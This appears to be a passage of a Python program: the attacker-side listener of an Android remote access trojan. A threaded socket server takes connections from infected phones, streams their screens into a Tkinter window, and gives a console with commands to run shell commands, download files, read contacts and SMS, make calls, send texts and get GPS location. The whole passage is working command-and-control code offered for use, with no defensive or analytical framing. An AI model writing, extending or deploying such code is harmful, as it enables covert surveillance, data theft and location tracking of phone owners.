class ScreenViewer:
    def __init__(self):
        self.root = tk.Tk()
        self.root.title("Android Screen Viewer")
        self.root.geometry("800x600")
        self.canvas = tk.Canvas(self.root, bg='black')
        self.canvas.pack(fill=tk.BOTH, expand=True)
        self.image_queue = queue.Queue()
        self.update()
    
    def update(self):
        try:
            img = self.image_queue.get_nowait()
            if img is not None:
                # Resize to fit window
                window_width = self.root.winfo_width()
                window_height = self.root.winfo_height()
                if window_width > 1 and window_height > 1:
                    img_resized = cv2.resize(img, (window_width, window_height))
                    img_rgb = cv2.cvtColor(img_resized, cv2.COLOR_BGR2RGB)
                    img_pil = Image.fromarray(img_rgb)
                    img_tk = ImageTk.PhotoImage(img_pil)
                    self.canvas.delete("all")
                    self.canvas.create_image(0, 0, anchor=tk.NW, image=img_tk)
                    self.canvas.image = img_tk
        except queue.Empty:
            pass
        self.root.after(50, self.update)
    
    def show(self):
        self.root.mainloop()

class RemoteClient:
    def __init__(self, conn, addr):
        self.conn = conn
        self.addr = addr
        self.running = True
        self.streaming = False
        self.viewer = None
    
    def handle(self):
        print(f"\n[+] Connected to {self.addr}")
        
        # Get device info
        try:
            data = self.conn.recv(1024).decode().strip()
            if data.startswith("DEVICE_INFO:"):
                info = data[12:]
                print(f"[Device] {info}")
        except:
            pass
        
        # Start command thread
        cmd_thread = threading.Thread(target=self.command_loop)
        cmd_thread.daemon = True
        cmd_thread.start()
        
        # Handle incoming data
        while self.running:
            try:
                if self.streaming:
                    # Read image size
                    size_data = self.conn.recv(4)
                    if not size_data or len(size_data) < 4:
                        continue
                    img_size = struct.unpack('!I', size_data)[0]
                    
                    # Read image data
                    img_data = b''
                    remaining = img_size
                    while remaining > 0:
                        chunk = self.conn.recv(min(8192, remaining))
                        if not chunk:
                            break
                        img_data += chunk
                        remaining -= len(chunk)
                    
                    # Decode and display image
                    img = cv2.imdecode(np.frombuffer(img_data, np.uint8), cv2.IMREAD_COLOR)
                    if img is not None and self.viewer:
                        self.viewer.image_queue.put(img)
                else:
                    # Handle other data (file transfers, command output)
                    self.conn.settimeout(0.1)
                    try:
                        data = self.conn.recv(1024).decode().strip()
                        if data:
                            print(data)
                    except socket.timeout:
                        pass
                    self.conn.settimeout(None)
            except Exception as e:
                if self.running:
                    print(f"Error: {e}")
                break
        
        self.conn.close()
        print(f"[-] Disconnected from {self.addr}")
    
    def command_loop(self):
        while self.running:
            try:
                cmd = input(f"\033[92m{self.addr[0]}>\033[0m ")
                
                if cmd == "help":
                    print("""
Commands:
  stream              - Start screen streaming
  stop                - Stop screen streaming
  shell <command>     - Execute shell command
  get <file>          - Download file
  ls [path]           - List directory
  contacts            - Get contacts
  sms                 - Get SMS messages
  call <number>       - Make phone call
  send <num> <msg>    - Send SMS
  location            - Get GPS location
  ping                - Test connection
  exit                - Disconnect
                    """)
                
                elif cmd == "stream":
                    self.conn.send(b"START_STREAM\n")
                    self.streaming = True
                    self.viewer = ScreenViewer()
                    viewer_thread = threading.Thread(target=self.viewer.show)
                    viewer_thread.daemon = True
                    viewer_thread.start()
                    print("[*] Screen streaming started")
                
                elif cmd == "stop":
                    self.conn.send(b"STOP_STREAM\n")
                    self.streaming = False
                    if self.viewer:
                        self.viewer.root.quit()
                    print("[*] Screen streaming stopped")
                
                elif cmd.startswith("shell "):
                    self.conn.send(f"SHELL:{cmd[6:]}\n".encode())
                
                elif cmd.startswith("get "):
                    self.conn.send(f"GET_FILE:{cmd[4:]}\n".encode())
                    self.receive_file()
                
                elif cmd == "ls":
                    self.conn.send(b"LIST_FILES\n")
                
                elif cmd.startswith("ls "):
                    self.conn.send(f"LIST_FILES:{cmd[3:]}\n".encode())
                
                elif cmd == "contacts":
                    self.conn.send(b"GET_CONTACTS\n")
                
                elif cmd == "sms":
                    self.conn.send(b"GET_SMS\n")
                
                elif cmd.startswith("call "):
                    self.conn.send(f"CALL:{cmd[5:]}\n".encode())
                
                elif cmd.startswith("send "):
                    parts = cmd.split()
                    if len(parts) >= 3:
                        num = parts[1]
                        msg = ' '.join(parts[2:])
                        self.conn.send(f"SMS:{num}|{msg}\n".encode())
                
                elif cmd == "location":
                    self.conn.send(b"GET_LOCATION\n")
                
                elif cmd == "ping":
                    self.conn.send(b"PING\n")
                
                elif cmd == "exit":
                    self.conn.send(b"EXIT\n")
                    self.running = False
                    break
                
                else:
                    print("Unknown command. Type 'help'")
                    
            except Exception as e:
                print(f"Command error: {e}")
                break
    
    def receive_file(self):
        try:
            data = self.conn.recv(1024).decode().strip()
            if data.startswith("FILE_SIZE:"):
                size = int(data[10:])
                filename = input("Save as: ")
                
                with open(filename, 'wb') as f:
                    remaining = size
                    while remaining > 0:
                        data = self.conn.recv(min(8192, remaining))
                        f.write(data)
                        remaining -= len(data)
                print(f"✅ File saved as {filename}")
        except Exception as e:
            print(f"File receive error: {e}")

def start_server():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind((LISTENER_IP, LISTENER_PORT))
    server.listen(5)
    
    print(f"\033[92m")
    print("╔════════════════════════════════════════════╗")
    print("║    Android Remote Access Listener         ║")
    print("║    with Screen Streaming & Full Control   ║")
    print("╚════════════════════════════════════════════╝")
    print(f"\033[0m")
    print(f"Listening on {LISTENER_IP}:{LISTENER_PORT}")
    print("Waiting for connections...\n")
    
    while True:
        conn, addr = server.accept()
        client = RemoteClient(conn, addr)
        thread = threading.Thread(target=client.handle)
        thread.daemon = True
        thread.start()

if __name__ == "__main__":
